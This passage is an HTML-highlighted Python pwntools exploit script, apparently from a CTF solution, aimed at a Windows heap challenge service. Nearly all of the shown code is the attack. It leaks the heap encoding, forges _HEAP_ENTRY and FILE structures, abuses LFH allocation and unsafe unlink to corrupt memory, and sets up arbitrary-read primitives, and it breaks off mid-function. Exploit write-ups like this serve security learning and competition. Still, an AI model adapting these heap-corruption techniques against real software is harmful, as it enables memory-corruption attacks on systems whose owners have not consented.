<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">9</span><span class="p">:]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">go_back</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">go_back</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">persistent_leak</span><span class="p">(</span><span class="n">cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">disconn</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">leakLazy</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
    <span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
    <span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="c1"># log.info("_HEAP-&gt;Encoding = 0x%016x" % heap_encod)
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
    <span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
    <span class="s">'''
    0x10000027c80101c8
       +0x008 Size             : 0x1c8
       +0x00a Flags            : 0x1 ''
       +0x00b SmallTagIndex    : 0xc8 ''
       +0x008 SubSegmentCode   : 0xc80101c8
       +0x00c PreviousSize     : 0x27
       +0x00e SegmentOffset    : 0 ''
       +0x00e LFHFlags         : 0 ''
       +0x00f UnusedBytes      : 0x10 ''
    '''</span>

    <span class="c1"># log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>             <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>             <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span>    <span class="p">)</span> 
    <span class="n">open_file</span><span class="p">()</span>
    <span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
    <span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x27b2</span> <span class="c1"># can't leak null-byte
</span>    <span class="k">elif</span> <span class="n">cursor</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="c1"># default target is ntdll on _HEAP-&gt;LockVariable-&gt;Lock
</span>        <span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2c0</span>
        
    <span class="c1"># log.info("&amp;_HEAP = 0x%016x" % heap_base)
</span>
    <span class="c1"># make LFH to allocate new Userblock in chunk 4
</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
        <span class="n">open_file</span><span class="p">()</span>

    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
    <span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span>    <span class="c1"># base address
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>                
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
        <span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

    <span class="k">if</span> <span class="n">disconn</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
        <span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>
    <span class="k">return</span> <span class="n">result</span>


<span class="n">magic_switch</span> <span class="o">=</span> <span class="bp">True</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
    <span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
    <span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
    <span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
    <span class="s">'''
    0x10000027c80101c8
       +0x008 Size             : 0x1c8
       +0x00a Flags            : 0x1 ''
       +0x00b SmallTagIndex    : 0xc8 ''
       +0x008 SubSegmentCode   : 0xc80101c8
       +0x00c PreviousSize     : 0x27
       +0x00e SegmentOffset    : 0 ''
       +0x00e LFHFlags         : 0 ''
       +0x00f UnusedBytes      : 0x10 ''
    '''</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="c1"># big chunk for LFH's new UserBlock
</span>
    <span class="c1"># pre-setting for Unsafe Unlink
</span>    <span class="c1"># (0x1c80 - 0x40 - 0x200 - 0x1000)/2 = 0x520
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span> 

    <span class="c1"># this is chunk 6
</span>    <span class="c1"># set chunk_id to _HEP_ENTRY for Heap Feng-Shui
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x5353000053</span> <span class="o">^</span> <span class="n">heap_encod</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span>

    <span class="n">open_file</span><span class="p">()</span>
    <span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4, 5, 6
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4, 5, 6
</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
    <span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="c1"># make LFH to allocate new Userblock in chunk 4
</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
        <span class="n">open_file</span><span class="p">()</span>

    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>    <span class="c1"># +0x000 SubSegment
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>   <span class="c1"># +0x008 Reserved
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                   <span class="c1"># +0x010 SizeIndexAndPadding
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>            <span class="c1"># +0x014 Signature
</span>    <span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                 <span class="c1"># I couldn't leak other values
</span>
    <span class="c1"># cursor points heap_mem of chunk 3
</span>    <span class="n">cursor</span> <span class="o">=</span> <span class="mh">0xbeefdad0000</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span>

    <span class="c1"># HAVE TO set specific values to get input from STDIN
</span>    <span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR &lt;--|
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># base address &lt;--------|-- both must be equal
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                  <span class="c1"># remaining file size
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>                <span class="c1"># &lt;------------------------ only 0 or 1 or 2
</span>    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
    <span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">((</span><span class="mh">0x1000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">for_leak</span><span class="p">))</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">read_file</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

    <span class="c1"># ucrtbase!_pioinfo[0] has fixed heap offset
</span>    <span class="n">hi</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x8d48</span><span class="p">))</span> <span class="c1"># I dunno any details about windows FSOP...V_V
</span>    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>   <span class="c1"># But @scwuaptx said offset 0x38 is flag
</span>    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">9</span><span class="p">),</span> <span class="bp">False</span><span class="p">)</span>          <span class="c1"># this will switch text mode to binary mode
</span>
    <span class="n">fxxk</span> <span class="o">=</span> <span class="mh">0xbeefdad0000</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="c1"># heap_mem of chunk 6 
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x520</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># sizeof(chunk 5 and 6) + sizeof(_HEAP_ENTRY)
</span>                               <span class="c1"># have same heap_mem with chunk 5
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                    <span class="c1"># Actually it free'ing chunk 7
</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span>            <span class="c1"># Now, chunk 7 === chunk 5
</span>
    <span class="c1"># But chunk 7 is bigger than chunk 5
</span>    <span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x520</span> <span class="o">+</span> 
            <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> 
            <span class="n">p64</span><span class="p">(</span><span class="mh">0x5353000053</span> <span class="o">^</span> <span class="n">heap_encod</span><span class="p">)</span> <span class="o">+</span> 
            <span class="n">p64</span><span class="p">(</span><span class="n">fxxk</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># Flink-&gt;Blink = Flink
</span>            <span class="n">p64</span><span class="p">(</span><span class="n">fxxk</span><span class="p">)</span>       <span class="c1"># Blink-&gt;Flink = Blink
</span>                            <span class="c1"># satisfying unlink condition
</span>                            <span class="c1"># *(fxxk) = fxxk
</span>    <span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">)</span>
    
    <span class="n">lazy_id1</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span> 
    <span class="n">lazy_id2</span> <span class="o">=</span> <span class="mh">0xcafebabe</span>
    <span class="n">lazy_id3</span> <span class="o">=</span> <span class="mh">0x13371337</span>
    <span class="n">create_lazy_header</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">chunk_id</span> <span class="p">:</span> <span class="n">flat</span><span class="p">([</span>
                                               <span class="mh">0xddaabeef1acd</span><span class="p">,</span> 
                                               <span class="mh">0x200</span><span class="p">,</span>
                                               <span class="n">chunk_id</span><span class="p">,</span>
                                               <span class="mh">0xddaabeef1acd</span><span class="p">,</span> 
                                           <span class="p">],</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>

    <span class="n">lazy_header1</span> <span class="o">=</span> <span class="n">create_lazy_header</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">)</span>
    <span class="n">lazy_header2</span> <span class="o">=</span> <span class="n">create_lazy_header</span><span class="p">(</span><span class="n">lazy_id2</span><span class="p">)</span>
    <span class="n">lazy_header3</span> <span class="o">=</span> <span class="n">create_lazy_header</span><span class="p">(</span><span class="n">lazy_id3</span><span class="p">)</span>

    <span class="n">edit</span><span class="p">(</span><span class="mh">0x5353000053</span> <span class="o">^</span> <span class="n">heap_encod</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span> <span class="o">+</span> 
                                    <span class="n">lazy_header1</span> <span class="o">+</span> 
                                    <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">)</span>
    <span class="p">)</span>

    <span class="c1"># set lazy_header1 at 0xbeefdad0000
</span>    <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xbeefdad0000</span><span class="p">))</span> 

    <span class="c1"># Becuase of edit limit at "2. Edit File content",
</span>    <span class="c1"># HAVE TO keep modifying magic1
</span>    <span class="k">def</span> <span class="nf">lazy_read</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">magic_switch</span>

        <span class="k">if</span> <span class="n">magic_switch</span><span class="p">:</span>
            <span class="n">edit</span><span class="p">(</span><span class="n">lazy_id1</span><span class="p">,</span> <span class="n">lazy_header1</span> <span class="o">+</span> 
                           <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span>
